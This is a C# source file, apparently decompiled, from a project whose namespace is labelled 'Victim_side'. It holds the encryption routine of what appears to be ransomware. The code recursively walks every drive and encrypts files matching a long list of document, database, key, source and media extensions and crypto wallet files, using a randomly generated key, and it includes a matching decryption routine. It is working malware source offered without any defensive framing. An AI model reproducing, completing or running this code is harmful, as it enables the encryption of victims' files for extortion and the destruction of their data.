using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using Encrypt;

namespace ConsoleApp1.Victim_side;

public class FileExplorer
{
	private static string[] FileExtensions = new string[180]
	{
		".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".ARC", ".PAQ", ".accdb",
		".ai", ".asc", ".aes", ".asf", ".asm", ".asp", ".avi", ".backup", ".bak", ".bat",
		".bmp", ".brd", ".bz2", ".cgm", ".class", ".cmd", ".cpp", ".crt", ".cs", ".csr",
		".csv", ".db", ".dbf", ".dch", ".der", ".dif", ".dip", ".djvu", ".doc", ".docb",
		".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".edb", ".eml", ".fla", ".flv",
		".frm", ".gif", ".gpg", ".gz", ".hwp", ".ibd", ".iso", ".jar", ".java", ".jpeg",
		".jpg", ".js", ".jsp", ".key", ".lay", ".lay6", ".ldf", ".m3u", ".m4u", ".max",
		".mdb", ".mdf", ".mid", ".mkv", ".mml", ".mov", ".mp3", ".mp4", ".mpeg", ".mpg",
		".msg", ".myd", ".myi", ".nef", ".odb", ".odg", ".odp", ".ods", ".odt", ".onetoc2",
		".ost", ".otg", ".otp", ".ots", ".ott", ".p12", ".pas", ".pdf", ".pem", ".pfx",
		".php", ".pl", ".png", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm", ".ppsx",
		".ppt", ".pptm", ".pptx", ".ps1", ".psd", ".pst", ".rar", ".raw", ".rb", ".rtf",
		".sch", ".sh", ".sldm", ".sldx", ".slk", ".sln", ".snt", ".sql", ".sqlite3", ".sqlitedb",
		".stc", ".std", ".sti", ".stw", ".suo", ".svg", ".swf", ".sxc", ".sxd", ".sxi",
		".sxm", ".sxw", ".tar", ".tbk", ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot",
		".vb", ".vbs", ".vcd", ".vdi", ".vmdk", ".vmx", ".vob", ".vsd", ".vsdx", ".wav",
		".wb2", ".wk1", ".wks", ".wma", ".wmv", ".xlc", ".xlm", ".xls", ".xlsb", ".xlsm",
		".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".zip", ".c", ".py", ".st", "wallet.dat"
	};

	private static HashSet<string> set = new HashSet<string>(FileExtensions);

	private static global::Encrypt.Encrypt c = new global::Encrypt.Encrypt();

	private static StringCollection log = new StringCollection();

	private static HttpClient client = new HttpClient();

	public static byte[] CreateKey(int size)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[size];
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static void Walk(bool encrypt, byte[] key)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string driveName in array)
		{
			DriveInfo driveInfo = new DriveInfo(driveName);
			if (!driveInfo.IsReady)
			{
				Console.WriteLine("The drive {0} could not be read", driveInfo.Name);
				continue;
			}
			DirectoryInfo rootDirectory = driveInfo.RootDirectory;
			WalkDirectoryTree(rootDirectory, encrypt, key);
		}
		Console.WriteLine("Files with restricted access:");
		StringEnumerator enumerator = log.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				Console.WriteLine(current);
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		Console.WriteLine("Press any key");
		Console.ReadKey();
	}

	private static void WalkDirectoryTree(DirectoryInfo root, bool encrypt, byte[] key)
	{
		FileInfo[] array = null;
		DirectoryInfo[] array2 = null;
		try
		{
			array = root.GetFiles("*.*");
		}
		catch (UnauthorizedAccessException ex)
		{
			log.Add(ex.Message);
		}
		catch (DirectoryNotFoundException ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		if (array == null)
		{
			return;
		}
		FileInfo[] array3 = array;
		foreach (FileInfo fileInfo in array3)
		{
			if (encrypt && set.Contains(fileInfo.Extension.ToLower()))
			{
				try
				{
					c.FileEncrypt(fileInfo.FullName, key);
				}
				catch (Exception ex3)
				{
					Console.WriteLine(ex3.Message);
				}
			}
			if (!encrypt && fileInfo.Extension.ToLower().Contains(".aes"))
			{
				try
				{
					c.FileDecrypt(fileInfo.FullName, key);
				}
				catch (Exception ex4)
				{
					Console.WriteLine(ex4.Message);
				}
			}
		}
		array2 = root.GetDirectories();
		DirectoryInfo[] array4 = array2;
		foreach (DirectoryInfo root2 in array4)
		{
			WalkDirectoryTree(root2, encrypt, key);
		}
	}
}
